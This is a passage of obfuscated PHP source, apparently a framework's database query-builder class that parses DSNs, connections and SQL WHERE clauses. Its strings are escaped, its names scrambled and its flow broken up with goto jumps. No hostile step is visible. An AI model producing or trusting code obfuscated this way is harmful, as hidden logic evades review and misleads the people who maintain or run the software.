''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\x71" => "\x3c\x3e", "\147\x74" => "\76", "\145\x67\x74" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\x6f\x74\x6c\151\x6b\x65" => "\x4e\117\124\x20\x4c\111\x4b\105", "\154\x69\153\145" => "\114\111\x4b\105", "\151\x6e" => "\x49\x4e", "\x6e\157\164\x69\x6e" => "\116\x4f\124\40\x49\x4e", "\x6e\157\164\40\x69\156" => "\x4e\117\124\x20\111\116", "\x62\145\164\x77\145\x65\x6e" => "\x42\105\124\x57\105\105\116", "\x6e\x6f\x74\142\145\164\167\145\145\156" => "\116\117\x54\40\x42\105\124\x57\105\x45\x4e", "\x6e\x6f\x74\x20\x62\145\164\167\145\x65\156" => "\116\117\124\x20\x42\x45\124\127\105\105\116"); protected $selectSql = "\123\x45\114\x45\103\124\x25\104\111\x53\x54\x49\x4e\103\x54\x25\x20\45\x46\111\x45\114\x44\x25\40\106\x52\x4f\x4d\40\45\x54\101\102\x4c\x45\45\45\x4a\117\111\116\x25\x25\x57\110\105\x52\105\x25\x25\107\x52\117\125\120\45\x25\110\x41\126\x49\116\107\45\45\x4f\x52\104\105\122\45\45\x4c\111\x4d\x49\x54\x25\40\45\x55\x4e\111\x4f\x4e\45\45\x43\117\x4d\115\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $bİæäô™¼â = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ïº«‚ßèÔˆø][903], $bİæäô™¼â); } public function factory($D©¯ŒÓÙ— = '') { goto DŒÌäœº˜ƒ; d²Û ¹ˆ‘: $this->dbType = ucwords(strtolower($D©¯ŒÓÙ—[$d‡Çåœçè·[904]])); $DÆØá©‚¸÷ = $d‡Çåœçè·[906] . $this->dbType; if (class_exists($DÆØá©‚¸÷)) { $dïÃã¡¶ƒÊ = new $DÆØá©‚¸÷($D©¯ŒÓÙ—); if ($d‡Çåœçè·[739] != strtolower($D©¯ŒÓÙ—[$d‡Çåœçè·[904]])) { $dïÃã¡¶ƒÊ->dbType = strtoupper($this->dbType); } else { $dïÃã¡¶ƒÊ->dbType = $this->_getDsnType($D©¯ŒÓÙ—[$d‡Çåœçè·[859]]); } } else { think_exception(think_lang($d‡Çåœçè·[907]) . $d‡Çåœçè·[908] . $DÆØá©‚¸÷); } goto E’Ò…ä»Û; E’Ò…ä»Û: return $dïÃã¡¶ƒÊ; goto FÑ±áêÁº; DŒÌäœº˜ƒ: $d‡Çåœçè· =& $_SERVER[Ïº«‚ßèÔˆø]; $D©¯ŒÓÙ— = $this->parseConfig($D©¯ŒÓÙ—); if (empty($D©¯ŒÓÙ—[$d‡Çåœçè·[904]])) { think_exception(think_lang($d‡Çåœçè·[905])); } goto d²Û ¹ˆ‘; FÑ±áêÁº: } public function __call($eæ æë›Éğ, $C¯ÓĞ‰ÀÂä) { if (method_exists($this, $eæ æë›Éğ)) { return call_user_func_array(array($this, $eæ æë›Éğ), $C¯ÓĞ‰ÀÂä); } } protected function _getDsnType($fØ“ğí’‰×) { $EŠÕÑ“‰äŠ = explode($_SERVER[Ïº«‚ßèÔˆø][4], $fØ“ğí’‰×); $aí¨Œˆ£–Ş = strtoupper(trim($EŠÕÑ“‰äŠ[0])); return $aí¨Œˆ£–Ş; } private function parseConfig($a’©Ô”ß« = '') { $D±ÏÈšØ¡¢ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!empty($a’©Ô”ß«) && is_string($a’©Ô”ß«)) { $a’©Ô”ß« = $this->parseDSN($a’©Ô”ß«); } elseif (is_array($a’©Ô”ß«)) { $a’©Ô”ß« = array_change_key_case($a’©Ô”ß«); $a’©Ô”ß« = array($D±ÏÈšØ¡¢[904] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[738]], $D±ÏÈšØ¡¢[832] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[909]], $D±ÏÈšØ¡¢[833] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[910]], $D±ÏÈšØ¡¢[830] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[911]], $D±ÏÈšØ¡¢[831] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[912]], $D±ÏÈšØ¡¢[17] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[913]], $D±ÏÈšØ¡¢[859] => $a’©Ô”ß«[$D±ÏÈšØ¡¢[740]], $D±ÏÈšØ¡¢[13] => isset($a’©Ô”ß«[$D±ÏÈšØ¡¢[914]]) ? $a’©Ô”ß«[$D±ÏÈšØ¡¢[914]] : array()); } elseif (empty($a’©Ô”ß«)) { if (think_config($D±ÏÈšØ¡¢[915]) && $D±ÏÈšØ¡¢[739] != strtolower(think_config($D±ÏÈšØ¡¢[916]))) { $a’©Ô”ß« = $this->parseDSN(think_config($D±ÏÈšØ¡¢[915])); } else { $a’©Ô”ß« = array($D±ÏÈšØ¡¢[904] => think_config($D±ÏÈšØ¡¢[916]), $D±ÏÈšØ¡¢[832] => think_config($D±ÏÈšØ¡¢[917]), $D±ÏÈšØ¡¢[833] => think_config($D±ÏÈšØ¡¢[918]), $D±ÏÈšØ¡¢[830] => think_config($D±ÏÈšØ¡¢[919]), $D±ÏÈšØ¡¢[831] => think_config($D±ÏÈšØ¡¢[920]), $D±ÏÈšØ¡¢[17] => think_config($D±ÏÈšØ¡¢[243]), $D±ÏÈšØ¡¢[859] => think_config($D±ÏÈšØ¡¢[915]), $D±ÏÈšØ¡¢[13] => think_config($D±ÏÈšØ¡¢[921])); } } return $a’©Ô”ß«; } protected function initConnect($CåĞº÷÷ğâ = true) { if (1 == think_config($_SERVER[Ïº«‚ßèÔˆø][18])) { $this->_linkID = $this->multiConnect($CåĞº÷÷ğâ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $dƒ‹æ¤Çµ => $e›¥«…ì¨î) { $this->_linkID = $e›¥«…ì¨î; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($aæ®¦õÄ¨ = false) { goto Dš÷™³Èá¢; d…åŠÍŸ¹İ: $bõò¯à·öŒ = array($d´¯ŞÃ®Û‘[832] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[832]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[832]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[832]][0], $d´¯ŞÃ®Û‘[833] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[833]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[833]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[833]][0], $d´¯ŞÃ®Û‘[830] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[830]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[830]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[830]][0], $d´¯ŞÃ®Û‘[831] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[831]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[831]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[831]][0], $d´¯ŞÃ®Û‘[17] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[17]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[17]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[17]][0], $d´¯ŞÃ®Û‘[859] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[859]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[859]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[859]][0], $d´¯ŞÃ®Û‘[13] => isset($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[13]][$f™¨äÅ¿›]) ? $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[13]][$f™¨äÅ¿›] : $f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[13]][0]); return $this->connect($bõò¯à·öŒ, $f™¨äÅ¿›); goto BÂ‚µá°˜¸; BÌàÎƒÆèŠ: if (empty($f‡¤Æ¨Ëİƒ)) { foreach ($this->config as $aÜ£áÛ”ËŞ => $Aä½ƒ´Çƒ) { $f‡¤Æ¨Ëİƒ[$aÜ£áÛ”ËŞ] = explode($d´¯ŞÃ®Û‘[47], $Aä½ƒ´Çƒ); } } if (think_config($d´¯ŞÃ®Û‘[922])) { if ($aæ®¦õÄ¨) { $f™¨äÅ¿› = floor(mt_rand(0, think_config($d´¯ŞÃ®Û‘[923]) - 1)); $E·È¶éİô¼ = $f™¨äÅ¿›; } else { if (is_numeric(think_config($d´¯ŞÃ®Û‘[924]))) { $f™¨äÅ¿› = think_config($d´¯ŞÃ®Û‘[924]); } else { $f™¨äÅ¿› = floor(mt_rand(think_config($d´¯ŞÃ®Û‘[923]), count($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[830]]) - 1)); } } } else { $f™¨äÅ¿› = floor(mt_rand(0, count($f‡¤Æ¨Ëİƒ[$d´¯ŞÃ®Û‘[830]]) - 1)); $E·È¶éİô¼ = $f™¨äÅ¿›; } $f™¨äÅ¿› = $E·È¶éİô¼ !== -1 ? $E·È¶éİô¼ : $f™¨äÅ¿›; goto d…åŠÍŸ¹İ; Dš÷™³Èá¢: $d´¯ŞÃ®Û‘ =& $_SERVER[Ïº«‚ßèÔˆø]; static $f‡¤Æ¨Ëİƒ = array(); static $E·È¶éİô¼ = -1; goto BÌàÎƒÆèŠ; BÂ‚µá°˜¸: } public function parseDSN($f°èÓˆ¨Ï) { $Eç•‹¾¬‚‹ =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($f°èÓˆ¨Ï)) { return !1; } $bÄ×„Úøò = parse_url($f°èÓˆ¨Ï); if ($bÄ×„Úøò[$Eç•‹¾¬‚‹[174]]) { $fù±ñóˆËñ = array($Eç•‹¾¬‚‹[904] => $bÄ×„Úøò[$Eç•‹¾¬‚‹[174]], $Eç•‹¾¬‚‹[832] => isset($bÄ×„Úøò[$Eç•‹¾¬‚‹[561]]) ? $bÄ×„Úøò[$Eç•‹¾¬‚‹[561]] : $Eç•‹¾¬‚‹[33], $Eç•‹¾¬‚‹[833] => isset($bÄ×„Úøò[$Eç•‹¾¬‚‹[925]]) ? $bÄ×„Úøò[$Eç•‹¾¬‚‹[925]] : $Eç•‹¾¬‚‹[33], $Eç•‹¾¬‚‹[830] => isset($bÄ×„Úøò[$Eç•‹¾¬‚‹[175]]) ? $bÄ×„Úøò[$Eç•‹¾¬‚‹[175]] : $Eç•‹¾¬‚‹[33], $Eç•‹¾¬‚‹[831] => isset($bÄ×„Úøò[$Eç•‹¾¬‚‹[176]]) ? $bÄ×„Úøò[$Eç•‹¾¬‚‹[176]] : $Eç•‹¾¬‚‹[33], $Eç•‹¾¬‚‹[17] => isset($bÄ×„Úøò[$Eç•‹¾¬‚‹[76]]) ? substr($bÄ×„Úøò[$Eç•‹¾¬‚‹[76]], 1) : $Eç•‹¾¬‚‹[33]); } else { preg_match($Eç•‹¾¬‚‹[926], trim($f°èÓˆ¨Ï), $A•œ•”ìë÷); $fù±ñóˆËñ = array($Eç•‹¾¬‚‹[904] => $A•œ•”ìë÷[1], $Eç•‹¾¬‚‹[832] => $A•œ•”ìë÷[2], $Eç•‹¾¬‚‹[833] => $A•œ•”ìë÷[3], $Eç•‹¾¬‚‹[830] => $A•œ•”ìë÷[4], $Eç•‹¾¬‚‹[831] => $A•œ•”ìë÷[5], $Eç•‹¾¬‚‹[17] => $A•œ•”ìë÷[6]); } $fù±ñóˆËñ[$Eç•‹¾¬‚‹[859]] = $Eç•‹¾¬‚‹[33]; return $fù±ñóˆËñ; } protected function debug() { $Aã³¼ÇİÍÜ =& $_SERVER[Ïº«‚ßèÔˆø]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Aã³¼ÇİÍÜ[927]; if (think_config($Aã³¼ÇİÍÜ[928])) { think_status($Aã³¼ÇİÍÜ[929]); think_trace($this->queryStr . $Aã³¼ÇİÍÜ[930] . think_status($Aã³¼ÇİÍÜ[20], $Aã³¼ÇİÍÜ[929], 6) . $Aã³¼ÇİÍÜ[931], $Aã³¼ÇİÍÜ[33], $Aã³¼ÇİÍÜ[932]); } } protected function parseLock($cåííŠ ÷ = false) { $AˆÏ›©†Ÿ‚ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$cåííŠ ÷) { return $AˆÏ›©†Ÿ‚[33]; } if ($AˆÏ›©†Ÿ‚[861] == $this->dbType) { return $AˆÏ›©†Ÿ‚[933]; } return $AˆÏ›©†Ÿ‚[934]; } protected function parseSet($b´Ñø¬…Û) { $Câ‰òŠ¾èİ =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($b´Ñø¬…Û as $Cƒ¯áŞ¶Åõ => $F®º’ç¤…¯) { if (is_array($F®º’ç¤…¯) && $Câ‰òŠ¾èİ[294] == $F®º’ç¤…¯[0]) { $f„´©“°Òß[] = $this->parseKey($Cƒ¯áŞ¶Åõ) . $Câ‰òŠ¾èİ[935] . $F®º’ç¤…¯[1]; } elseif (is_scalar($F®º’ç¤…¯) || is_null($F®º’ç¤…¯)) { $f„´©“°Òß[] = $this->parseKey($Cƒ¯áŞ¶Åõ) . $Câ‰òŠ¾èİ[935] . $this->parseValue($F®º’ç¤…¯); } } return $Câ‰òŠ¾èİ[936] . implode($Câ‰òŠ¾èİ[47], $f„´©“°Òß); } protected function bindParam($a±î¦°Ö‡, $dßÙ¶ù²Æ) { $this->bind[$_SERVER[Ïº«‚ßèÔˆø][4] . $a±î¦°Ö‡] = $dßÙ¶ù²Æ; } protected function parseBind($f‹“¼¶¸¼Å) { $f‹“¼¶¸¼Å = array_merge($this->bind, $f‹“¼¶¸¼Å); $this->bind = array(); return $f‹“¼¶¸¼Å; } function parseKey(&$f†âî¨¦—, $Dˆ¯ö‹•ïª = true) { if ($Dˆ¯ö‹•ïª) { $f†âî¨¦— = $this->parseKeyCheck($f†âî¨¦—); } return $f†âî¨¦—; } function parseKeyCheck($fÁÄÄÇ’›²) { $aÊî«ïÒ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÁÄÄÇ’›² = trim($fÁÄÄÇ’›²); if (!preg_match($aÊî«ïÒ[937], $fÁÄÄÇ’›²)) { think_exception($aÊî«ïÒ[938] . $fÁÄÄÇ’›²); } return $fÁÄÄÇ’›²; } protected function parseValue($Eˆø¾ùóÖÒ) { $dÈª¿Ùë =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_string($Eˆø¾ùóÖÒ)) { $Eˆø¾ùóÖÒ = $dÈª¿Ùë[900] . $this->escapeString($Eˆø¾ùóÖÒ) . $dÈª¿Ùë[900]; } elseif (isset($Eˆø¾ùóÖÒ[0]) && is_string($Eˆø¾ùóÖÒ[0]) && strtolower($Eˆø¾ùóÖÒ[0]) == $dÈª¿Ùë[294]) { $Eˆø¾ùóÖÒ = $this->escapeString($Eˆø¾ùóÖÒ[1]); } elseif (is_array($Eˆø¾ùóÖÒ)) { $Eˆø¾ùóÖÒ = array_map(array($this, $dÈª¿Ùë[901]), $Eˆø¾ùóÖÒ); } elseif (is_bool($Eˆø¾ùóÖÒ)) { $Eˆø¾ùóÖÒ = $Eˆø¾ùóÖÒ ? $dÈª¿Ùë[87] : $dÈª¿Ùë[495]; } elseif (is_null($Eˆø¾ùóÖÒ)) { $Eˆø¾ùóÖÒ = $dÈª¿Ùë[103]; } return $Eˆø¾ùóÖÒ; } protected function parseField($d²Áì´ÊˆŞ) { $B¦àÖ–ôã£ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_string($d²Áì´ÊˆŞ) && strpos($d²Áì´ÊˆŞ, $B¦àÖ–ôã£[47])) { $d²Áì´ÊˆŞ = explode($B¦àÖ–ôã£[47], $d²Áì´ÊˆŞ); } if (is_array($d²Áì´ÊˆŞ)) { $a×–Ì×ç¾» = array(); foreach ($d²Áì´ÊˆŞ as $d¡…‡ò›‡Â => $DÆ·ƒœãÊ¥) { if (!is_numeric($d¡…‡ò›‡Â)) { $a×–Ì×ç¾»[] = $this->parseKey($d¡…‡ò›‡Â, !1) . $B¦àÖ–ôã£[939] . $this->parseKey($DÆ·ƒœãÊ¥); } else { $a×–Ì×ç¾»[] = $this->parseKey($DÆ·ƒœãÊ¥); } } $e¸Œ„öùÔ = implode($B¦àÖ–ôã£[47], $a×–Ì×ç¾»); } elseif (is_string($d²Áì´ÊˆŞ) && !empty($d²Áì´ÊˆŞ)) { $e¸Œ„öùÔ = $d²Áì´ÊˆŞ; } else { $e¸Œ„öùÔ = $B¦àÖ–ôã£[182]; } return $e¸Œ„öùÔ; } protected function parseTable($FÃØ»ùôÑ») { $F‡«õìß¬° =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_array($FÃØ»ùôÑ»)) { $fó†äæï¡ê = array(); foreach ($FÃØ»ùôÑ» as $dÒì•Ü”åõ => $F°¾È÷ÙÀê) { if (!is_numeric($dÒì•Ü”åõ)) { $fó†äæï¡ê[] = $this->parseKey($dÒì•Ü”åõ) . $F‡«õìß¬°[50] . $this->parseKey($F°¾È÷ÙÀê); } else { $fó†äæï¡ê[] = $this->parseKey($dÒì•Ü”åõ); } } $FÃØ»ùôÑ» = $fó†äæï¡ê; } elseif (is_string($FÃØ»ùôÑ»)) { if (strstr($FÃØ»ùôÑ», $F‡«õìß¬°[50])) { return $FÃØ»ùôÑ»; } $FÃØ»ùôÑ» = explode($F‡«õìß¬°[47], $FÃØ»ùôÑ»); array_walk($FÃØ»ùôÑ», array($this, $F‡«õìß¬°[850])); } return $F‡«õìß¬°[844] . trim(implode($F‡«õìß¬°[940], $FÃØ»ùôÑ»), $F‡«õìß¬°[381]) . $F‡«õìß¬°[844]; } protected function parseWhere($C©Œö¾Ôš) { $E¹ÒÂÎ°Ö =& $_SERVER[Ïº«‚ßèÔˆø]; $B—ÔÒ‹İ¿‰ = $E¹ÒÂÎ°Ö[33]; if (is_string($C©Œö¾Ôš)) { $B—ÔÒ‹İ¿‰ = $C©Œö¾Ôš; } else { $a¯À½§ãºé = isset($C©Œö¾Ôš[$E¹ÒÂÎ°Ö[941]]) ? strtoupper($C©Œö¾Ôš[$E¹ÒÂÎ°Ö[941]]) : $E¹ÒÂÎ°Ö[33]; if (in_array($a¯À½§ãºé, array($E¹ÒÂÎ°Ö[942], $E¹ÒÂÎ°Ö[943], $E¹ÒÂÎ°Ö[944]))) { $a¯À½§ãºé = $E¹ÒÂÎ°Ö[50] . $a¯À½§ãºé . $E¹ÒÂÎ°Ö[50]; unset($C©Œö¾Ôš[$E¹ÒÂÎ°Ö[941]]); } else { $a¯À½§ãºé = $E¹ÒÂÎ°Ö[945]; } foreach ($C©Œö¾Ôš as $FÕ©­•¤²‚ => $E¢á‰²©¡ï) { $B—ÔÒ‹İ¿‰ .= $E¹ÒÂÎ°Ö[274]; if (is_numeric($FÕ©­•¤²‚)) { $FÕ©­•¤²‚ = $E¹ÒÂÎ°Ö[946]; } if (0 === strpos($FÕ©­•¤²‚, $E¹ÒÂÎ°Ö[71])) { $B—ÔÒ‹İ¿‰ .= $this->parseThinkWhere($FÕ©­•¤²‚, $E¢á‰²©¡ï); } else { if (!preg_match($E¹ÒÂÎ°Ö[947], trim($FÕ©­•¤²‚))) { think_exception(think_lang($E¹ÒÂÎ°Ö[948]) . $E¹ÒÂÎ°Ö[4] . $FÕ©­•¤²‚); } $a¡ÏøíÃ—• = is_array($E¢á‰²©¡ï) && isset($E¢á‰²©¡ï[$E¹ÒÂÎ°Ö[949]]); $FÕ©­•¤²‚ = trim($FÕ©­•¤²‚); if (strpos($FÕ©­•¤²‚, $E¹ÒÂÎ°Ö[280])) { $AêÕªš²× = explode($E¹ÒÂÎ°Ö[280], $FÕ©­•¤²‚); $F‡àŒØ˜¨° = array(); foreach ($AêÕªš²× as $FÃÍ¤Ù¯¿Ë => $EÔ¢´Ÿ›¨) { $Aâ¯”ñ¶‹È = $a¡ÏøíÃ—• ? $E¢á‰²©¡ï[$FÃÍ¤Ù¯¿Ë] : $E¢á‰²©¡ï; $F‡àŒØ˜¨°[] = $E¹ÒÂÎ°Ö[257] . $this->parseWhereItem($this->parseKey($EÔ¢´Ÿ›¨), $Aâ¯”ñ¶‹È) . $E¹ÒÂÎ°Ö[849]; } $B—ÔÒ‹İ¿‰ .= implode($E¹ÒÂÎ°Ö[950], $F‡àŒØ˜¨°); } elseif (strpos($FÕ©­•¤²‚, $E¹ÒÂÎ°Ö[281])) { $AêÕªš²× = explode($E¹ÒÂÎ°Ö[281], $FÕ©­•¤²‚); $F‡àŒØ˜¨° = array(); foreach ($AêÕªš²× as $FÃÍ¤Ù¯¿Ë => $EÔ¢´Ÿ›¨) { $Aâ¯”ñ¶‹È = $a¡ÏøíÃ—• ? $E¢á‰²©¡ï[$FÃÍ¤Ù¯¿Ë] : $E¢á‰²©¡ï; $F‡àŒØ˜¨°[] = $E¹ÒÂÎ°Ö[257] . $this->parseWhereItem($this->parseKey($EÔ¢´Ÿ›¨), $Aâ¯”ñ¶‹È) . $E¹ÒÂÎ°Ö[849]; } $B—ÔÒ‹İ¿‰ .= implode($E¹ÒÂÎ°Ö[945], $F‡àŒØ˜¨°); } else { $B—ÔÒ‹İ¿‰ .= $this->parseWhereItem($this->parseKey($FÕ©­•¤²‚), $E¢á‰²©¡ï); } } $B—ÔÒ‹İ¿‰ .= $E¹ÒÂÎ°Ö[275] . $a¯À½§ãºé; } $B—ÔÒ‹İ¿‰ = substr($B—ÔÒ‹İ¿‰, 0, -strlen($a¯À½§ãºé)); } return empty($B—ÔÒ‹İ¿‰) ? $E¹ÒÂÎ°Ö[33] : $E¹ÒÂÎ°Ö[951] . $B—ÔÒ‹İ¿‰; } protected function parseWhereItem($b¹òêŒ¾Ö, $fˆ‚’’åöå) { $BæÈŸŒŸƒÏ =& $_SERVER[Ïº«‚ßèÔˆø]; $EáÒãÛ±‰ = $BæÈŸŒŸƒÏ[33]; if (is_array($fˆ‚’’åöå)) { if (is_string($fˆ‚’’åöå[0])) { $b ÖÊëá = strtolower($fˆ‚’’åöå[0]); if (in_array($fˆ‚’’åöå[0], array($BæÈŸŒŸƒÏ[935], $BæÈŸŒŸƒÏ[952], $BæÈŸŒŸƒÏ[953], $BæÈŸŒŸƒÏ[954], $BæÈŸŒŸƒÏ[955], $BæÈŸŒŸƒÏ[956]))) { $EáÒãÛ±‰ .= $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $fˆ‚’’åöå[0] . $BæÈŸŒŸƒÏ[50] . $this->parseValue($fˆ‚’’åöå[1]); } elseif (preg_match($BæÈŸŒŸƒÏ[957], $fˆ‚’’åöå[0])) { $EáÒãÛ±‰ .= $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $this->exp[$b ÖÊëá] . $BæÈŸŒŸƒÏ[50] . $this->parseValue($fˆ‚’’åöå[1]); } elseif (preg_match($BæÈŸŒŸƒÏ[958], $fˆ‚’’åöå[0])) { if (is_array($fˆ‚’’åöå[1])) { $b±Ó„§ÛæÁ = isset($fˆ‚’’åöå[2]) ? strtoupper($fˆ‚’’åöå[2]) : $BæÈŸŒŸƒÏ[943]; if (in_array($b±Ó„§ÛæÁ, array($BæÈŸŒŸƒÏ[942], $BæÈŸŒŸƒÏ[943], $BæÈŸŒŸƒÏ[944]))) { $BÊßêì¤÷Ö = array(); foreach ($fˆ‚’’åöå[1] as $A¯Æ„óœö„) { $BÊßêì¤÷Ö[] = $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $this->exp[$b ÖÊëá] . $BæÈŸŒŸƒÏ[50] . $this->parseValue($A¯Æ„óœö„); } $EáÒãÛ±‰ .= $BæÈŸŒŸƒÏ[257] . implode($BæÈŸŒŸƒÏ[50] . $b±Ó„§ÛæÁ . $BæÈŸŒŸƒÏ[50], $BÊßêì¤÷Ö) . $BæÈŸŒŸƒÏ[849]; } } else { $EáÒãÛ±‰ .= $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $this->exp[$b ÖÊëá] . $BæÈŸŒŸƒÏ[50] . $this->parseValue($fˆ‚’’åöå[1]); } } elseif ($BæÈŸŒŸƒÏ[294] == $b ÖÊëá) { $EáÒãÛ±‰ .= $BæÈŸŒŸƒÏ[847] . $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $fˆ‚’’åöå[1] . $BæÈŸŒŸƒÏ[959]; } elseif (preg_match($BæÈŸŒŸƒÏ[960], $fˆ‚’’åöå[0])) { $EáÒãÛ±‰ .= $fˆ‚’’åöå[0]; } elseif (preg_match($BæÈŸŒŸƒÏ[961], $fˆ‚’’åöå[0])) { if (isset($fˆ‚’’åöå[2]) && $BæÈŸŒŸƒÏ[294] == $fˆ‚’’åöå[2]) { $EáÒãÛ±‰ .= $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $this->exp[$b ÖÊëá] . $BæÈŸŒŸƒÏ[50] . $fˆ‚’’åöå[1]; } else { if (is_string($fˆ‚’’åöå[1])) { $fˆ‚’’åöå[1] = explode($BæÈŸŒŸƒÏ[47], $fˆ‚’’åöå[1]); } $FÛšÌèª˜ = implode($BæÈŸŒŸƒÏ[47], $this->parseValue($fˆ‚’’åöå[1])); $EáÒãÛ±‰ .= $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $this->exp[$b ÖÊëá] . $BæÈŸŒŸƒÏ[847] . $FÛšÌèª˜ . $BæÈŸŒŸƒÏ[849]; } } elseif (preg_match($BæÈŸŒŸƒÏ[962], $fˆ‚’’åöå[0])) { $f“­õ”­ = is_string($fˆ‚’’åöå[1]) ? explode($BæÈŸŒŸƒÏ[47], $fˆ‚’’åöå[1]) : $fˆ‚’’åöå[1]; $EáÒãÛ±‰ .= $BæÈŸŒŸƒÏ[847] . $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $this->exp[$b ÖÊëá] . $BæÈŸŒŸƒÏ[50] . $this->parseValue($f“­õ”­[0]) . $BæÈŸŒŸƒÏ[945] . $this->parseValue($f“­õ”­[1]) . $BæÈŸŒŸƒÏ[275]; } else { think_exception(think_lang($BæÈŸŒŸƒÏ[948]) . $BæÈŸŒŸƒÏ[4] . $fˆ‚’’åöå[0]); } } else { $EĞÙ¹œ«Ûµ = count($fˆ‚’’åöå); $EÁ¢¡ÙøÊ = $BæÈŸŒŸƒÏ[33]; if (is_string($fˆ‚’’åöå[$EĞÙ¹œ«Ûµ - 1])) { $EÁ¢¡ÙøÊ = isset($fˆ‚’’åöå[$EĞÙ¹œ«Ûµ - 1]) ? strtoupper($fˆ‚’’åöå[$EĞÙ¹œ«Ûµ - 1]) : $BæÈŸŒŸƒÏ[33]; if (in_array($EÁ¢¡ÙøÊ, array($BæÈŸŒŸƒÏ[942], $BæÈŸŒŸƒÏ[943], $BæÈŸŒŸƒÏ[944]))) { $EĞÙ¹œ«Ûµ = $EĞÙ¹œ«Ûµ - 1; } } else { $EÁ¢¡ÙøÊ = $BæÈŸŒŸƒÏ[942]; } for ($F£¾öŞÉöœ = 0; $F£¾öŞÉöœ < $EĞÙ¹œ«Ûµ; $F£¾öŞÉöœ++) { $f“­õ”­ = is_array($fˆ‚’’åöå[$F£¾öŞÉöœ]) ? $fˆ‚’’åöå[$F£¾öŞÉöœ][1] : $fˆ‚’’åöå[$F£¾öŞÉöœ]; if ($BæÈŸŒŸƒÏ[294] == strtolower($fˆ‚’’åöå[$F£¾öŞÉöœ][0])) { $EáÒãÛ±‰ .= $BæÈŸŒŸƒÏ[257] . $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $f“­õ”­ . $BæÈŸŒŸƒÏ[959] . $EÁ¢¡ÙøÊ . $BæÈŸŒŸƒÏ[50]; } else { $BˆŒ§ÒÔ = is_array($fˆ‚’’åöå[$F£¾öŞÉöœ]) ? $this->exp[strtolower($fˆ‚’’åöå[$F£¾öŞÉöœ][0])] : $BæÈŸŒŸƒÏ[935]; if (!$BˆŒ§ÒÔ && is_array($fˆ‚’’åöå[$F£¾öŞÉöœ]) && in_array($fˆ‚’’åöå[$F£¾öŞÉöœ][0], array($BæÈŸŒŸƒÏ[935], $BæÈŸŒŸƒÏ[952], $BæÈŸŒŸƒÏ[953], $BæÈŸŒŸƒÏ[954], $BæÈŸŒŸƒÏ[955], $BæÈŸŒŸƒÏ[956]))) { $BˆŒ§ÒÔ = $fˆ‚’’åöå[$F£¾öŞÉöœ][0]; } $EáÒãÛ±‰ .= $BæÈŸŒŸƒÏ[257] . $b¹òêŒ¾Ö . $BæÈŸŒŸƒÏ[50] . $BˆŒ§ÒÔ . $BæÈŸŒŸƒÏ[50] . $this->parseValue($f“­õ”­) . $BæÈŸŒŸƒÏ[959] . $EÁ¢¡ÙøÊ . $BæÈŸŒŸƒÏ[50]; } } $EáÒãÛ±‰ 